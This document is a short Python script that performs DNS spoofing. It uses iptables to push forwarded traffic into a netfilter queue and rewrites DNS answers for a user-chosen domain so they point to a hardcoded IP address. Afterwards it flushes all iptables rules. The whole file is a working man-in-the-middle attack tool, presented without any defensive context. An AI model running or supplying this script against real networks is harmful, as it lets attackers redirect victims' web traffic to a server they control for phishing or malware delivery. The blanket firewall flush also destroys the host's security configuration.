#!/usr/bin/env python
import subprocess
import netfilterqueue
import scapy.all as scapy

#Redirect_ip = str(raw_input("where do you want to redirect(IP address)>> "))
from_where = str(raw_input("which wesite do you want to redirect('.' for any)>>"))


def process_packet_dns_spoof(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname
            if from_where in qname:
                print("[+] Spoofing target...")
                answer = scapy.DNSRR(rrname=qname, rdata="173.249.55.128")
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len        
        packet.set_payload(str(scapy_packet))
        packet.accept()



def dns_spoof():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet_dns_spoof)
    queue.run()


subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
dns_spoof()
subprocess.call("iptables --flush", shell=True)
